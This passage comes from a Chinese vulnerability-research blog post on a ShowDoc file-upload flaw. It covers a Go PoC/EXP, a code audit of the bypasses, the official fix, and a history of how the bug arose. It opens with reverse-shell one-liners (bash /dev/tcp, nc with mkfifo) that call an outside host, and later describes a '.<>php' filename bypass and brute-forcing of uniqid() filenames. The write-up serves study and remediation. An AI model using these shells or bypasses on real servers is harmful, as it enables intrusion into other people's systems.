&gt;&amp; <span class="hljs-regexp">/dev/</span>tcp/godserver.tk/<span class="hljs-number">35355</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-comment">//ReverseTCPByNcBsd</span><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc godserver.tk <span class="hljs-number">35355</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br><span class="hljs-comment">//ReverseTCPBySh</span><br><span class="hljs-number">0</span>&lt;&amp;<span class="hljs-number">1</span>-;exec <span class="hljs-number">1</span>&lt;&gt;<span class="hljs-regexp">/dev/</span>tcp/godserver.tk/<span class="hljs-number">35355</span>;sh -i &lt;&amp;<span class="hljs-number">1</span> &gt;&amp;<span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%209.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2010.png"></p><h2 id="3-3-最终效果"><a href="#3-3-最终效果" class="headerlink" title="3.3 最终效果"></a>3.3 最终效果</h2><p>代码放在仓库：<a href="https://github.com/corp0ra1/showDocDemo">https://github.com/corp0ra1/showDocDemo</a></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled.gif"></p><h2 id="3-4-发散思维"><a href="#3-4-发散思维" class="headerlink" title="3.4 发散思维"></a>3.4 发散思维</h2><p>上述操作基本把Goby提供的功能基本都尝试了个遍，就剩下个DNSLOG也尝试一下？比如第二次请求之后不通过返回值判断而是根据DNSLOG的结果？</p><h1 id="4-更进一步-代码审计-TL-DR"><a href="#4-更进一步-代码审计-TL-DR" class="headerlink" title="4. 更进一步-代码审计 TL;DR"></a>4. 更进一步-代码审计 TL;DR</h1><p>上述操作只是完成了漏洞的复现，以及POC&amp;EXP的编写，但是心中还是有疑问</p><ul><li>为什么文件名后缀使用<code>.&lt;&gt;php</code>就可以绕过?</li><li>为什么我尝试<code>.&lt;php</code>的后缀绕过方式不行？</li><li>为什么有这种神奇的绕过方法？</li><li>什么原因导致的？</li></ul><p>十万个为什么，最终促使了我进行代码审计！</p><blockquote><p>不会代码审计，只能一步步的断点跟踪分析，笨办法</p></blockquote><h2 id="4-1-showdoc如何限制文件上传的"><a href="#4-1-showdoc如何限制文件上传的" class="headerlink" title="4.1 showdoc如何限制文件上传的"></a>4.1 showdoc如何限制文件上传的</h2><h3 id="4-1-1-先黑名单检测"><a href="#4-1-1-先黑名单检测" class="headerlink" title="4.1.1 先黑名单检测"></a>4.1.1 先黑名单检测</h3><p>检测文件名中是否包含php字样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2011.png"></p><h3 id="4-1-2-再白名单检测"><a href="#4-1-2-再白名单检测" class="headerlink" title="4.1.2 再白名单检测"></a>4.1.2 再白名单检测</h3><p>检测文件后缀名是否在upload类的<code>$ext</code>数组白名单中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;exts&#x27;</span>]) ? <span class="hljs-literal">true</span> : in_array(strtolower(<span class="hljs-variable">$ext</span>), <span class="hljs-keyword">$this</span>-&gt;exts);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2012.png"></p><h3 id="4-1-3-最后图片内容检测"><a href="#4-1-3-最后图片内容检测" class="headerlink" title="4.1.3 最后图片内容检测"></a>4.1.3 最后图片内容检测</h3><p>仅对图像文件进行进一步检测，其他类型则放行（有些鸡肋）</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2013.png"></p><h2 id="4-2-绕过方法一：畸形后缀绕过"><a href="#4-2-绕过方法一：畸形后缀绕过" class="headerlink" title="4.2 绕过方法一：畸形后缀绕过"></a>4.2 绕过方法一：畸形后缀绕过</h2><h3 id="4-2-1-绕过方式"><a href="#4-2-1-绕过方式" class="headerlink" title="4.2.1 绕过方式"></a>4.2.1 绕过方式</h3><p>文件名为：<code>test.&lt;&gt;php</code></p><h3 id="4-2-2-原理"><a href="#4-2-2-原理" class="headerlink" title="4.2.2 原理"></a>4.2.2 原理</h3><p><code>.&lt;&gt;php</code>的方式绕过了黑名单对<code>.php</code>检测</p><p>而在之后的showdoc\server\ThinkPHP\Library\Think\Upload.class.php 的<code>upload()</code>函数中对文件名使用了<code>strip_tags()</code>函数进行处理，去掉了<code>&lt;&gt;</code>标签，还原后缀名为php。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2014.png"></p><h3 id="4-2-3-修复方案"><a href="#4-2-3-修复方案" class="headerlink" title="4.2.3 修复方案"></a>4.2.3 修复方案</h3><p>在进行黑名单检测时，先用<code>strip_tags()</code>函数对输入文件名进行处理（有趣的是我在另外一个路径下的同名文件中发现了这种修复方案）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//漏洞版本：showdoc\server\Application\Home\Controller\PageController.class.php</span><br><br>strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br><br><span class="hljs-comment">//另外一个路径下的修复版本：showdoc\server\Application\Api\Controller\PageController.class.php</span><br><br>strstr(strip_tags(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])), <span class="hljs-string">&quot;.php&quot;</span>) <br></code></pre></td></tr></table></figure><h3 id="4-2-4-追问：不是后面还会进行白名单检测吗？"><a href="#4-2-4-追问：不是后面还会进行白名单检测吗？" class="headerlink" title="4.2.4 追问：不是后面还会进行白名单检测吗？"></a>4.2.4 追问：不是后面还会进行白名单检测吗？</h3><blockquote><p>重头戏，这个引发后续一系列问题！</p></blockquote><p>虽然前面绕过了黑名单检测，但是后面还有白名单检测，那么这里怎么绕过的呢？</p><p>赋值问题：后缀的白名单数组赋值给了upload类中的<code>allowExts</code>变量：<code>$upload-&gt;allowExts = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> ，但是检测文件名后缀的时候使用upload类中的<code>exts</code>变量：<code>$this-&gt;config[&#39;exts&#39;]</code> ，错付了值，显而易见，exts变量为空，故绕过了后缀名的check。</p><p>这是开发者在开发时疏漏导致的白名单检测缺陷，将<code>$upload-&gt;allowExts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code>对应代码更改为<code>$upload-&gt;exts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> 即可修复</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2015.png"></p><h2 id="4-3-绕过方法二：修改输入名称"><a href="#4-3-绕过方法二：修改输入名称" class="headerlink" title="4.3 绕过方法二：修改输入名称"></a>4.3 绕过方法二：修改输入名称</h2><h3 id="4-3-1-绕过方式"><a href="#4-3-1-绕过方式" class="headerlink" title="4.3.1 绕过方式"></a>4.3.1 绕过方式</h3><p>将文件输入名称改为<code>editormd-image-file1</code>，如  <code>name=&quot;editormd-image-file1&quot;; filename=&quot;test.php&quot;</code> </p><h3 id="4-3-2-原理"><a href="#4-3-2-原理" class="headerlink" title="4.3.2 原理"></a>4.3.2 原理</h3><p>因为他只检测输入名为<code>editormd-image-file</code> 文件的文件名是否包含php，修改对应的输入名即可。通过此方式同样绕过了黑名单的检测，结合白名单的缺陷，以实现目的</p><p><strong>举一反三</strong>：这也解释了为什么其他场景的文件上传中可以通过修改这个字段名称的方式绕过了文件上传限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="4-3-3-缺陷"><a href="#4-3-3-缺陷" class="headerlink" title="4.3.3 缺陷"></a>4.3.3 缺陷</h3><p>虽然在文件夹中看到文件成功上传，但是返回的文件路径中没有文件名</p><p>查看源码后发现：是因为在返回的文件名中又一次使用到了<code>editormd-image-file</code> ，并通过这个名来获取文件保存路径。由于我们更改了输入名，并不存在<code>editormd-image-file</code> 的键值，故返回了文件名为空。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2016.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2017.png"></p><h3 id="4-3-4-进一步绕过"><a href="#4-3-4-进一步绕过" class="headerlink" title="4.3.4 进一步绕过"></a>4.3.4 进一步绕过</h3><p>虽然没有返回文件名，但是文件是上传成功的，那么如何知道上传后的文件名？</p><p>跟踪源码，发现文件命名调用了<code>uniqid()</code> 函数，而该函数的定义是基于以微秒计的当前时间，生成一个唯一的 ID。根据函数的定义，那么在极短的时间内发送两个包，那么文件名应该是相近的。</p><p>方法一：第一个正常上传返回路径，第二个修改输入名不返回路径，依据时间递增遍历即可找到，但是爆破不知上限有些盲目。</p><p>方法二：php文件在两个包之间，对应文件名也在两个包时间之间。如下图，需要爆破5位数</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2018.png"></p><h3 id="4-3-5-更进一步"><a href="#4-3-5-更进一步" class="headerlink" title="4.3.5 更进一步"></a>4.3.5 更进一步</h3><p>通过查看<a href="http://document.thinkphp.cn/manual_3_2.html#upload">thinkphp文档</a>后发现，其支持多文件上传。测试后多文件上传后，发现文件处理时间间隔更近，命名更相似，3位数，对应爆破次数不超过4000次，效率更高。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2019.png"></p><h2 id="4-4-官方修复方案"><a href="#4-4-官方修复方案" class="headerlink" title="4.4 官方修复方案"></a>4.4 官方修复方案</h2><p>修复白名单赋值导致的缺陷即可，将<code>$upload-&gt;allowExts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code>对应代码更改为<code>$upload-&gt;exts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code></p><p><a href="https://github.com/star7th/showdoc/commit/189b6cedc011a0d2758f4207cb85c565372093dd">https://github.com/star7th/showdoc/commit/189b6cedc011a0d2758f4207cb85c565372093dd</a></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2020.png"></p><h2 id="4-5-其他失败尝试"><a href="#4-5-其他失败尝试" class="headerlink" title="4.5 其他失败尝试"></a>4.5 其他失败尝试</h2><h3 id="4-5-1-直接上传php"><a href="#4-5-1-直接上传php" class="headerlink" title="4.5.1 直接上传php"></a>4.5.1 直接上传php</h3><p><strong>原因</strong>：最早跟踪&lt;&gt;的漏洞成因，发现是白名单后缀检测失效导致的，既然白名单失效，为什么不考虑直接上传php</p><p><strong>过程</strong>：测试失败，然后下断点跟踪代码。</p><p><strong>收获</strong>：发现了其还有一层黑名单验证机制</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2021.png"></p><h3 id="4-5-2-strlower通过Unicode字符绕过"><a href="#4-5-2-strlower通过Unicode字符绕过" class="headerlink" title="4.5.2 strlower通过Unicode字符绕过"></a>4.5.2 strlower通过Unicode字符绕过</h3><p>原因：最近打<a href="https://blog.csdn.net/wanmiqi/article/details/117044715">CISCN2021</a>的一道upload题目，遇到在<code>strtolower</code> 进行黑名单匹配时可通过unicode绕过</p><p><strong>过程</strong>：仔细查看后发现我记错了，CTF中题目是<code>mb_strtolowe</code>r，而此处是<code>strtolower</code></p><p><strong>收获</strong>：对<code>strtolower</code>和<code>mb_strtolower</code>理解更深</p><h3 id="4-5-3-htaccess绕过"><a href="#4-5-3-htaccess绕过" class="headerlink" title="4.5.3 .htaccess绕过"></a>4.5.3 .htaccess绕过</h3><p><strong>背景</strong>：黑名单只限制php，phtml可以上传，但无法被解析，那么可以上传<code>.htaccess</code>使之支持解析吗？</p><p><strong>过程</strong>：测试，发现上传的<code>.htaccess</code> 会被重命名为<code>60d150f6ee711.htaccess</code></p><p><strong>结局</strong>：不再发散，点到为止</p><h1 id="5-有趣的溯源"><a href="#5-有趣的溯源" class="headerlink" title="5. 有趣的溯源"></a>5. 有趣的溯源</h1><h2 id="5-1-漏洞起源于CTF"><a href="#5-1-漏洞起源于CTF" class="headerlink" title="5.1 漏洞起源于CTF"></a>5.1 漏洞起源于CTF</h2><ol><li>plzmyy师傅最早通报这个漏洞给<a href="https://github.com/star7th/showdoc/pull/1059%E3%80%82">showdoc官方</a>在2020年的八月</li><li>plzmyy师傅提到了最早出现在RoarCTF2019的赛事中的simple_upload题目<a href="https://www.fuzzer.xyz/2019/10/14/RoarCTF2019">Ethan师傅的WP</a></li><li>Ethan师傅发现&lt;&gt;绕过方法是fuzz出来这个非预期解，而查看绝大部分WP以及<a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/tree/master/Web/simple_upload/writeup">疑似官方的WP</a>中介绍的是利用uniqid()的函数可爆破的点，似乎没注意到这个非预期解。</li><li>Ethan师傅文章中提到疑似0day，引起了我的兴趣，我想分析到底是哪个day？</li></ol><h2 id="5-2-疑似0day"><a href="#5-2-疑似0day" class="headerlink" title="5.2 疑似0day"></a>5.2 疑似0day</h2><ol><li>检索相关关键词，没有发现0day，而且到现在都没有爆出来，离谱！更加吸引了我的兴趣</li><li>搜索引擎限定搜索时间为19年10月RoarCTF开赛之前，发现一个14的<a href="https://www.jb51.net/article/54209.htm">《ThinkPHP文件上传实例教程》</a>一个15年的<a href="http://www.splaybow.com/post/thinkphp-file-upload-sample.html">《ThinkPHP文件上传的实例代码》</a>网页介绍了如何使用ThinkPHP文件上传 ，其使用的方法就是<code>$upload-&gt;allowExts</code>错误的写法，而ThinkPHP官方3.2版本的<a href="http://document.thinkphp.cn/manual_3_2.html#upload">说明文档</a>中则使用的是正确的<code>$upload-&gt;exts</code>写法</li><li>那么为什么ThinkPHP官方是对的，而民间大家用的是这种错误的写法？会不会是官方早期版本教学用的就是这个错误的写法？</li></ol><h2 id="5-3-官方自相矛盾吗"><a href="#5-3-官方自相矛盾吗" class="headerlink" title="5.3 官方自相矛盾吗"></a>5.3 官方自相矛盾吗</h2><ol><li>怀疑是ThinkPHP3.2以下版本的官方文档自身用了错误的写法，而民间只是历史沿用这一用法，搜了<a href="http://www.thinkphp.cn/info/194.html">ThinkPHP3.1的说明文档</a>，果不其然用的就是<code>$upload-&gt;allowExts</code> 的错误方式</li><li>那么TP3.2官方为什么在文档中更正TP3.1中的错误的写法？是因为当时爆出了漏洞吗？遗憾的是检索后发现TP3.1并没有爆出这类漏洞</li><li>继续追踪，查看3.1和3.2官方源码发现：是在TP从3.1到3.2版本升级的时候，由于编写文件上传类的负责人换了<code>liu21st</code>→<code>zuojiazi</code>，使得①类名<code>UploadFile()</code> →<code>Upload()</code>②白名单后缀数组名<code>allowExts</code> → <code>ext</code>③文件名，文件路径等发生变更。</li><li>仔细对比3.1和3.2的文档，发现虽然源码发生改变，但对应的教学文档也发生了相应的改变，本质上并不存在漏洞。</li><li>也就说①3.1版本的源码配合3.1的文档，<code>$upload = new UploadFile()</code>搭配<code>$upload-&gt;allowExts</code>不会产生漏洞；②3.2版本的源码配合3.2的文档，<code>$upload = new \Think\Upload()</code>搭配<code>$upload-&gt;exts</code>也不会发生漏洞。③但是3.2的版本使用3.1的文档，<code>$upload = new \Think\Upload()</code>搭配<code>$upload-&gt;allowExts</code>就会产生漏洞，而showdoc的漏洞成因很大几率来源于此。</li><li>再次百度、Google相关教程网页，发现民间教程也都和官方文档一样，一一对应（刚刚只关注键名的不同没关注类名的不同，误会民间教程了）。</li><li>也就说官方教程不存在问题，网上教程也不存在问题，如showdoc官方案例这种错赋值的写法并未检索到，那么只能是个人了！</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2022.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2023.png"></p><h2 id="5-4-大结局：个人问题"><a href="#5-4-大结局：个人问题" class="headerlink" title="5.4 大结局：个人问题"></a>5.4 大结局：个人问题</h2><ol><li>真的是个人问题吗？</li><li>再往前追：2016年8月showdocV1.0.0版本就存在<a href="https://github.com/star7th/showdoc/blob/v1.0.0/Application/Home/Controller/PageController.class.php">这种错误的写法</a>，但是14年TP3.2就出现了</li><li>由于两个作品发布前后间隔两年，首先怀疑作者是基于一个通用模板或CMS改的，但是检索了半天开源框架并没有发现类似案例。</li><li>其次只能怀疑是面向百度编程的通病：①百度内容②发现官网文档③发现demo，但是运行失败③魔改一番，手动将类名由uploadfile改为upload⑤程序运行成功⑥不影响正常业务⑦大功告成！</li><li>我按照这个步骤复现之后发现很类似，最后和作者取得联系，和怀疑的基本差不多。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2024.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2025.png"></p><h2 id="5-5-时间线"><a href="#5-5-时间线" class="headerlink" title="5.5 时间线"></a>5.5 时间线</h2><p>2013年06月07日：ThinkPHP3.1.3发布，使用<code>UploadFile()-&gt;allowExts</code></p><p>2014年02月03日：ThinkPHP3.2 发布，使用<code>Upload()-&gt;exts</code></p><p>2016年08月07日：showdocV1.0.0发布 ，使用<code>UploadFile()-&gt;exts</code> </p><p>2019年10月12日：RoarCTF开赛，并于14日Ethan师傅Fuzz出了这个点，但其未深究</p><p>2020年08月12日：plzmyy师傅根据Ethan师傅的WP发现showDoc的漏洞</p><h2 id="5-6-总结"><a href="#5-6-总结" class="headerlink" title="5.6 总结"></a>5.6 总结</h2><p>溯源到最后，可以说showdoc是个特例，是由于开发者的一时疏忽导致的。诚然在这个里面个人开发者占很大的问题，但也希望给厂商企业敲响一个警钟，在版本升级时不仅要注意文档和代码的对应性，也需要在更改类的字段名时候慎重考虑。</p><p>对于Ethan师傅也有点可惜，他觉得是个0day，但未深究跟踪一下代码，也许他就真的发现了一个0day。</p><p>对于CTFer来说，也需要多看WP，也许能收获到不同的东西</p><p>对于面向百度编程的我，也需要警惕不要做一个盲目CV的代码首席移动工程师。</p><h1 id="6-大总结"><a href="#6-大总结" class="headerlink" title="6. 大总结"></a>6. 大总结</h1><p>从一个文件上传1day的复现开始，到用Goby简单的GUI编写POC&amp;EXP，再到不满足需求，于是选择用Go语言编写，并且使用Goby自带API不断优化POC，最终实现一键反弹shell。不仅学习了Go，也对EXP进一步的完善。</p><p>代码审计，从一个为什么产生出发，不断地问自己问题，虽然是一次简单的代审，延伸出一次溯源，最后的收获远不止一次代码审计，不可思议的是我的总结居然升华到了人。</p><p>正如Zwell说的“不断问自己问题”的学习方法，随着不停的问自己问题，记录下问题解决它，好奇心吸引着我，最后抵达了一个新的高度，共勉！</p>]]></content>
    
    
    <categories>
      
      <category>漏洞研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>POC编写</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
